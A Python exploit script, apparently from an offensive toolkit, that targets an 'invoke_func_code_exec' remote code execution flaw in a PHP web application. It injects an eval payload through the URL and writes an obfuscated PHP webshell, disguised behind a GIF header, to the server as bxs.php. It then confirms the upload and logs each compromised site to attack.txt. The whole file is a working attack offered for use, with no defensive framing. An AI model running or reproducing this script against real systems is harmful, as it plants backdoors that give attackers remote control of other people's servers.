import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def check(url):
    print(f"[info] {url}-invoke_func_code_exec漏洞")
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36",
        "Accept": "text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2",
        "Content-Length": "319",
        "Connection": "close"
    }

    try:
        urljia = "/index.php?s=/sd/iex/xxx/${@eval($_GET[x])}&x=file_put_contents('bxs.php',base64_decode('R2lmODlhPD9waHAgY2xhc3MgR1lVSjlnN2wgeyBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJEg3elgzKXsgQGV2YWwoIi8qWjdDYzR1cldWOSovIi4kSDd6WDMuIi8qWjdDYzR1cldWOSovIik7IH19bmV3IEdZVUo5ZzdsKCRfUkVRVUVTVFsnNGs0ZDY2NiddKTs%2FPg%3D%3D'));"
        urlt = url
        url = url + urljia
        requests.get(url=f'{url}',headers=headers,verify=False,timeout=5)
        res = requests.post(url=f"{url}/bxs.php",headers=headers,verify=False,timeout=5)
        if "Gif89a" in res.text :
            print(f"---->[invoke_func_code_exec] 上传成功，请检查：{urlt}/bxs.php")
            with open("attack.txt",'a') as attack:
                attack.write(f"shell:{urlt}/bxs.php,invoke_func_code_exec\n")

            
    except:
        print(f"[error] {url}-invoke_func_code_exec漏洞")
    pass